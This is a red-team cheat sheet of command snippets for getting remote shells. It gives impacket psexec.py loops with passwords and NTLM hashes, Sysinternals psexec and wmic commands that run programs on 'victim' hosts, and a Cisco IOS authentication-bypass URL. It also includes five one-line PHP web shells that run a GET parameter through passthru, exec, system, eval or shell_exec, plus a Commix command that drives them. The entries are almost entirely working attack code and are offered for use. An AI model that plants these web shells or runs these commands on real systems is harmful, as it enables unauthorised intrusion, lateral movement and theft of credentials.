### 1. loop around and open cmd, Psexecy.py != psexec msf != sysinternals psexec
```
for host in $(cat hosts.txt); do psexec.py [DOM]/[USER]:'[PASS]'@$host "cmd.exe"; done
```
**- linux,loop,impacket,remote command shell**
#### References:

https://yg.ht
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 2. PSExec with hashses
```
psexec.py -hashes [LM]:[NTLM] [DOM]/[USER]@[TARGET] "cmd.exe"
```
**- linux,impacket,remote command shell,hashes**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 3. windows psexec : \\127.0.0.1\c$\cmd.exe -p can be pass OR hash
```
psexec /accepteula \\[victim] -u [domain]\[user] -p [password] -c -f \\[victim]\[share\[file]
```
**- pivoting,Windows,remote command shell**
#### References:

https://technet.microsoft.com/en-us/sysinternals/pxexec.aspx
__________
### 4. execute command on remote host from remote smb share
```
wmic /node:[victim] /user:[domain]\[user] /password:[password] process call create "\\[host]\[share]\[exe]"
```
**- smb,Windows,remote command shell**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 5. Bypass auth on ios 11.2-12.2
```
http://[ip]/level/56/exec/show/config
```
**- cisco,interesting,web application,remote command shell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 6. Php Simple shell, set aPasswordto access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){passthru($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.passthru.php
__________
### 7. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){exec($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.exec.php
__________
### 8. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){system($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.system.php
__________
### 9. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){eval($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.eval.php
__________
### 10. Php Simple shell, set Password to access, bis your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){shell_exec($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.shell-exec.php
__________
### 11. Commix abuse exec as per the php shells, nicer than burp repeater! 
```
/opt/commix/commix.py -u "https://[rip]:443/[resource]?[password]&cmd=1*" --force-ssl
```
**- web application,remote command shell**
#### References:

https://github.com/commixproject/commix
__________
